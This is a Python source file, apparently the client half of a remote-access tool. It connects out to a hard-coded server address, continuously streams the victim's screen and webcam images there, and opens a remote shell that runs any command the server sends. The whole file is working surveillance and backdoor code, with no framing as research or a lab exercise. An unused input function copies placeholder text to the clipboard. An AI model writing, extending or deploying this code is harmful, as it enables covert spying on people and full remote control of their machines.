import socket
import threading
import pyautogui
import cv2
import numpy as np
from PIL import ImageGrab
import subprocess
import pickle
import pyperclip

# Connect to the server
def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('10.0.1.33', 4782))  # Replace with server's IP
    
    # Start threads for screen capture, webcam stream, and remote shell
    threading.Thread(target=screen_capture, args=(client_socket,)).start()
    threading.Thread(target=webcam_stream, args=(client_socket,)).start()
    threading.Thread(target=receive_commands, args=(client_socket,)).start()

# Capture the screen and send it to the server
def screen_capture(client_socket):
    while True:
        screen = np.array(ImageGrab.grab())
        _, encoded_image = cv2.imencode('.jpg', screen)
        data = pickle.dumps(encoded_image)
        client_socket.sendall(data)

# Capture the webcam and send it to the server
def webcam_stream(client_socket):
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if ret:
            _, encoded_image = cv2.imencode('.jpg', frame)
            data = pickle.dumps(encoded_image)
            client_socket.sendall(data)

# Handle incoming shell commands from the server
def receive_commands(client_socket):
    while True:
        command = client_socket.recv(1024).decode()
        if command.startswith("execute"):
            result = execute_shell_command(command[8:])
            client_socket.sendall(result.encode())

# Execute shell command on the client machine
def execute_shell_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True)
        return result.stdout.decode() + result.stderr.decode()
    except Exception as e:
        return f"Error: {str(e)}"

# Send keyboard and mouse input to the server
def send_input(client_socket):
    while True:
        mouse_pos = pyautogui.position()
        mouse_input = f"MousePos:{mouse_pos[0]},{mouse_pos[1]}"
        client_socket.sendall(mouse_input.encode())
        pyperclip.copy("sample clipboard content")

if __name__ == '__main__':
    connect_to_server()
